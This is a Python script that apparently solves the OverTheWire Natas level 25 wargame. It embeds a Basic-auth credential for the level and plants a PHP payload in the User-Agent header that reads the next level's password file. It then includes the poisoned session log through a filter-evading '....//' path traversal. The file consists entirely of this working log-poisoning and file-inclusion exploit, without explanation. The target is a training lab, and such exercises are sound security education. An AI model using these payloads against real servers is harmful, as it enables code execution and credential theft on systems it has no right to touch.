import requests

headers = {
    'Authorization': 'Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==',
    'User-Agent': "<?php global $__MSG; $__MSG = file_get_contents('/etc/natas_webpass/natas26'); ?>"
}

phpsessid = 'thisisaphpsessid'

cookies = {
    'PHPSESSID': phpsessid
}

with requests.Session() as session:
    payload = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{phpsessid}.log"

    url = f"http://natas25.natas.labs.overthewire.org/?lang={payload}"

    request = session.get(url=url, headers=headers, cookies=cookies)

    content = request.content.decode('utf-8')

    print(content)
